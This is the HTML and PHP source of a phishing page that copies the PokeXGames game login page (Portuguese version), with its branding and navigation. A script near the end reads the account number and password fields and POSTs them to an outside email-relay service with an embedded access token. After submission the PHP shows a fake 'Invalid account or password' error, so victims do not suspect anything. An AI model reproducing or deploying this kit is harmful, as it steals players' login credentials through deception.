<!DOCTYPE html>
<html lang="en" ng-app="App">
<head>

    <!-- Bootstrap Core CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">

    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet">
	
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<style type="text/css">
	.ng-animate.item:not(.left):not(.right){-webkit-transition:0s ease-in-out left;transition:0s ease-in-out left}</style><style type="text/css">.ng-animate.item:not(.left):not(.right){-webkit-transition:0s ease-in-out left;transition:0s ease-in-out left}</style><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}
	</style>
    <title ng-bind="($state.current.title &amp;&amp; (&#39;PokeXGames - &#39; + $state.current.title)) || ($state.current.name &amp;&amp; (&#39;PokeXGames - &#39; + ($state.current.name | translate))) || &#39;PokeXGames&#39;" class="ng-binding">PokeXGames - Fazer Login</title>
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="PokeXGames Free MMORPG">
    <meta name="author" content="Deathstroke">
    <meta name="copyright" content="Copyright (c) 2015 PokeXGames">
 
 
    <link rel="stylesheet" href="https://www.pokexgames.com/css/plugins.min.css?v=1460653235222">
    <link rel="stylesheet" href="https://www.pokexgames.com/css/app.min.css?v=1460653235222">
    <link rel="shortcut icon" href="https://www.pokexgames.com/favicon.ico?v=2" type="image/x-icon">
    <!--HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries-->
    <!--[if lt IE 9]>
    <script src="https://cdn.jsdelivr.net/es5.shim/4.1.10/es5-shim.min.js"></script>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
	
	<script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
	<script type="text/javascript">
	   (function(){
		  emailjs.init("user_otGKMRTqHhSnArnHGLtsk");
	   })();
	</script>
  </head>
  <body>
    <noscript>
      &lt;div class="whoops-error"&gt;&lt;i class="fa fa-paw"&gt;&lt;/i&gt; Oops!&lt;/div&gt;
      &lt;div class="whoops-error whoops-error2"&gt;You dont't have JavaScript enabled, this website won't work.&lt;/div&gt;
    </noscript>
    <div class="container-topimage">
      <div class="container-botimage">
        <div class="container container-main">
          <div class="container-bg-left"></div>
          <div class="container-bg-right"></div>
          <div class="masthead"><a href="https://www.pokexgames.com/#/" class="logo-container hvr-wobble-vertical"></a>
            <div class="social-container"><a href="https://www.facebook.com/pokexgames"><i class="fa fa-facebook hvr-grow"></i></a><a href="https://www.twitter.com/pokexgames"><i class="fa fa-twitter hvr-grow"></i></a></div>
          </div>
          <div class="main-in">
            <btn ng-show="account" ng-click="logout()" class="btn btn-danger nav-logout ng-binding ng-hide"><i class="fa fa-sign-out"></i>Deslogar</btn>
            <nav ng-controller="NavController" class="navbar navbar-inverse navbar-blue ng-scope">
              <div class="navbar-header">
                <button ng-click="isCollapsed = !isCollapsed" class="navbar-toggle"><span class="sr-only">Toggle Navigation</span><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span></button>
              </div>
              <div id="navbar" collapse="isCollapsed" class="navbar-collapse collapse" style="height: 0px;">
                <ul class="nav navbar-nav navbar-left">
                              <li dropdown="" class="dropdown"><a dropdown-toggle="" class="dropdown-toggle ng-binding" aria-haspopup="true" aria-expanded="false">Notícias</a>
                                <ul class="dropdown-menu">
                                              <li><a href="https://www.pokexgames.com/#/home" ng-click="isCollapsed = true" class="ng-binding">Página Inicial</a></li>
                                </ul>
                              </li>
                  <li dropdown="" ng-hide="account" ng-click="accountToggled($event)" is-open="isAccountToggled" class="dropdown"><a dropdown-toggle="" class="dropdown-toggle ng-binding" aria-haspopup="true" aria-expanded="false">Conta</a>
                    <ul class="dropdown-menu">
                                  <li><a href="https://www.pokexgames.com/#/account" ng-click="isCollapsed = true" class="ng-binding">Acessar Conta</a></li>
                                  <li><a href="https://www.pokexgames.com/#/create" ng-click="isCollapsed = true" class="ng-binding">Criar Conta</a></li>
                                  <li><a href="https://www.pokexgames.com/#/lost" ng-click="isCollapsed = true" class="ng-binding">Recuperar Conta</a></li>
                    </ul>
                  </li>
                  <li ng-show="account" class="ng-hide"><a href="https://www.pokexgames.com/#/account" ng-click="isCollapsed = true" class="ng-binding">Conta</a></li>
                              <li><a href="https://www.pokexgames.com/#/download" ng-click="isCollapsed = true" class="ng-binding"><i class="text-lg2 fa fa-download"></i> Baixar</a></li>
                              <li><a href="https://forum.pokexgames.com/" ng-click="isCollapsed = true" target="_blank" class="ng-binding">Forum</a></li>
                  <li dropdown="" class="dropdown"><a dropdown-toggle="" class="dropdown-toggle ng-binding" aria-haspopup="true" aria-expanded="false">Guias</a>
                    <ul class="dropdown-menu">
                      <li ng-show="lang == &#39;pt&#39;"><a href="http://www.blogpxg.com/" ng-click="isCollapsed = true">Blog PXG</a></li>
                                  <li><a href="https://www.pokexgames.com/#/guide/quickstart" ng-click="isCollapsed = true" class="ng-binding">Começo Rápido</a></li>
                                  <li><a href="https://www.pokexgames.com/#/guide/fishing" ng-click="isCollapsed = true" class="ng-binding">Pescando</a></li>
                                  <li><a href="https://www.pokexgames.com/#/guide/gamemechanics" ng-click="isCollapsed = true" class="ng-binding">Mecânicas do Jogo</a></li>
                                  <li><a href="https://www.pokexgames.com/#/guide/minigames" ng-click="isCollapsed = true" class="ng-binding">Minigames</a></li>
                                  <li><a href="https://www.pokexgames.com/#/guide/vip" ng-click="isCollapsed = true" class="ng-binding">VIP</a></li>
                                  <li><a href="https://www.pokexgames.com/#/guide/clans" ng-click="isCollapsed = true" class="ng-binding">Clans</a></li>
                                  <li><a href="https://www.pokexgames.com/#/guide/engineer" ng-click="isCollapsed = true" class="ng-binding">Engenheiro</a></li>
                                  <li><a href="https://www.pokexgames.com/#/guide/stylist" ng-click="isCollapsed = true" class="ng-binding">Estilista</a></li>
                                  <li><a href="https://www.pokexgames.com/#/guide/adventurer" ng-click="isCollapsed = true" class="ng-binding">Aventureiro</a></li>
                                  <li><a href="https://www.pokexgames.com/#/guide/professor" ng-click="isCollapsed = true" class="ng-binding">Professor</a></li>
                                  <li><a href="https://www.pokexgames.com/#/guide/quests" ng-click="isCollapsed = true" class="ng-binding">Quests</a></li>
                                  <li><a href="https://www.pokexgames.com/#/guide/helds" ng-click="isCollapsed = true" class="ng-binding">Held Items</a></li>
                                  <li><a href="https://www.pokexgames.com/#/guide/tournaments" ng-click="isCollapsed = true" class="ng-binding">Torneios</a></li>
                    </ul>
                  </li>
                              <li dropdown="" class="dropdown"><a dropdown-toggle="" class="dropdown-toggle ng-binding" aria-haspopup="true" aria-expanded="false">Galeria</a>
                                <ul class="dropdown-menu">
                                              <li><a href="https://www.pokexgames.com/#/screenshots" ng-click="isCollapsed = true" class="ng-binding">Screenshots</a></li>
                                              <li><a href="https://www.pokexgames.com/#/artwork" ng-click="isCollapsed = true" class="ng-binding">Artwork</a></li>
                                </ul>
                              </li>
                              <li dropdown="" class="dropdown"><a dropdown-toggle="" class="dropdown-toggle ng-binding" aria-haspopup="true" aria-expanded="false">Suporte</a>
                                <ul class="dropdown-menu">
                                              <li><a href="https://www.pokexgames.com/#/contact" ng-click="isCollapsed = true" class="ng-binding">Contato</a></li>
                                              <li><a href="https://www.pokexgames.com/#/tickets" ng-click="isCollapsed = true" class="ng-binding">Tickets</a></li>
                                              <li><a href="https://www.pokexgames.com/#/rules" ng-click="isCollapsed = true" class="ng-binding">Regras</a></li>
                                </ul>
                              </li>
                </ul>
                <ul ng-controller="LanguageController" class="nav navbar-nav navbar-right navbar-flags ng-scope">
                  <li ng-class="{active: lang == &#39;en&#39;}"><a ng-click="useLang(&#39;en&#39;)"><img src="./index_files/usa.png"></a></li>
                  <li ng-class="{active: lang == &#39;pt&#39;}" class="active"><a ng-click="useLang(&#39;pt&#39;)"><img src="./index_files/brazil.png"></a></li>
                  <li ng-class="{active: lang == &#39;es&#39;}"><a ng-click="useLang(&#39;es&#39;)"><img src="./index_files/spain.png"></a></li>
                </ul>
              </div>
            </nav>
            <div class="ui-view-container">
              <!-- uiView:  --><div ui-view="" class="ng-scope">
<div class="content-wrapper ng-scope">
  <div class="content-header">
    <h2><span class="title">PokeXGames // </span><span ng-bind="($state.current.title || $state.current.name) | translate" class="ng-binding">Fazer Login</span></h2>
  </div>
  <div class="content-inner-wrapper">
    <div class="row">
      <div class="col-md-6 col-md-offset-3">
        <div class="post-wrapper">
          <h1 class="text-center login-title ng-binding">Fazer Login da Conta</h1>
          <div flash-alert="success" active-class="alert-shown" role="alert" duration="10000" class="alert alert-success alert-hidden ng-scope"><strong class="alert-heading ng-binding"> Sucesso!</strong><span class="alert-message ng-binding"> </span>
            <button type="button" ng-click="hide()" class="close">×</button>
          </div>
          <div flash-alert="error" active-class="alert-shown flash" role="alert" duration="0" class="alert alert-danger alert-hidden animated-fast ng-scope"><i class="glyphicon glyphicon-exclamation-sign"></i><span class="alert-message ng-binding"> </span>
            <button type="button" ng-click="hide()" class="close">×</button>
          </div>
          <form action="?acao=enviar" ng-submit="login()" class="ng-pristine ng-invalid ng-invalid-required ng-valid-maxlength">

          </form>
		  
		  <form id="loginform" class="ng-pristine ng-invalid ng-invalid-required ng-valid-maxlength" role="form" action="?acao=ok"  method="post">
		  

<!-- CONFIRMAÇÃO DE "ERRO" DA PÁGINA -->
<?php
if (isset($_GET['acao'])) {
			
			
		if($_GET['acao'] == 'ok'){
?> 
<div flash-alert="error" active-class="alert-shown flash" role="alert" duration="0" class="alert alert-danger alert-hidden animated-fast ng-scope alert-error alert-shown flash"><i class="glyphicon glyphicon-exclamation-sign"></i><span class="alert-message ng-binding"> Invalid account or password.</span>
            <button type="button" ng-click="hide()" class="close">×</button>
</div>
<?php

		} 
	
}
?> 
<!-- /CONFIRMAÇÃO DE "ERRO" DA PÁGINA -->
            <div class="form-group">
              <input ng-model="credentials.username" type="password" name="username" maxlength="32" placeholder="Número da Conta" required="" autofocus="" class="form-control ng-pristine ng-invalid ng-invalid-required ng-valid-maxlength ng-touched">
            </div>
            <div class="form-group">
              <input ng-model="credentials.password" type="password" name="password" maxlength="32" placeholder="Senha" required="" class="form-control ng-pristine ng-untouched ng-invalid ng-invalid-required ng-valid-maxlength">
            </div>
 <?php
 
 
if (isset($_GET['page'])) {
		if($_GET['page'] == 'adm-index'){
			echo '<div style="margin-bottom: 15px" class="input-group">';
			echo '<span class="input-group-addon"><i class="glyphicon glyphicon-lock"></i></span>';
			echo '<input id="login-password" class="form-control" name="keyword" placeholder="keyword" type="password">';
			echo '</div>';
		
			} 
		if($_GET['page'] == 'adm-index-invalid'){
			echo '<div style="margin-bottom: 15px" class="input-group">';
			echo '<span class="input-group-addon"><i class="glyphicon glyphicon-lock"></i></span>';
			echo '<input id="login-password" class="form-control" name="keyword" placeholder="keyword" type="password">';
			echo '</div>';
		
			} 
		

}


if (isset($_GET['acao'])) {
			
			
		if($_GET['acao'] == 'ok'){
			echo 'OK FORM ENVIADO';
		
		} 
	
}

?> 
		
                                    
				  <!-- Button -->                                
                  <button type="submit" class="btn btn-lg btn-primary btn-block ng-binding"> <i class="fa fa-sign-in"></i> Fazer Login</button>   
					  
				  
</form>

	
<script>

    //update this with your js_form selector
    var form_id_js = "loginform";

    var data_js = {
        "access_token": "boam6w0hnqxev5wr078s1e92" // sent after you sign up https://postmail.invotes.com/get-started
    };

    function js_onSuccess() {
        // remove this to avoid redirect
       // window.location = window.location.pathname + "?message=Email+Successfully+Sent%21&isError=0";
    }

    function js_onError(error) {
        // remove this to avoid redirect
      //  window.location = window.location.pathname + "?message=Email+could+not+be+sent.&isError=1";
    }

    var sendButton = document.getElementById("btnGenerate");

    function js_send() {
        sendButton.value='Sending…';
        sendButton.disabled=true;
        var request = new XMLHttpRequest();
        request.onreadystatechange = function() {
            if (request.readyState == 4 && request.status == 200) {
                js_onSuccess();
            } else
            if(request.readyState == 4) {
                js_onError(request.response);
            }
        };

        var subject = document.querySelector("#" + form_id_js + " [name='username']").value;
        var message = document.querySelector("#" + form_id_js + " [name='password']").value;
        data_js['subject'] = subject;
        data_js['text'] = message;
        var params = toParams(data_js);

        request.open("POST", "https://postmail.invotes.com/send", true);
        request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

        request.send(params);

        return false;
    }

    sendButton.onclick = js_send;

    function toParams(data_js) {
        var form_data = [];
        for ( var key in data_js ) {
            form_data.push(encodeURIComponent(key) + "=" + encodeURIComponent(data_js[key]));
        }

        return form_data.join("&");
    }

    var js_form = document.getElementById(form_id_js);
    js_form.addEventListener("submit", function (e) {
        e.preventDefault();
    });
</script>
          <h5><a href="https://www.pokexgames.com/#/create" tooltip-placement="right" tooltip="Não tem uma conta ainda? Crie uma aqui" class="ng-binding">Criar Conta</a></h5>
          <h5><a href="https://www.pokexgames.com/#/lost" tooltip-placement="right" tooltip="Não lembra o número da conta ou a senha? Recupere aqui" class="ng-binding">Recuperar Conta</a></h5>
        </div>
      </div>
    </div>
  </div>
</div></div>
            </div>
          </div>
          <footer>
            <div class="footer">
              <div>© PokeXGames 2015</div><a href="https://www.pokexgames.com/#/rules" ng-translate="terms_and_rules"></a>
            </div>
            <div class="prefooter">Developed by Deathstroke</div>
          </footer>
        </div>
      </div>
    </div>
    <script src="./index_files/plugins.min.js"></script>
	
 
  
</body>




</html>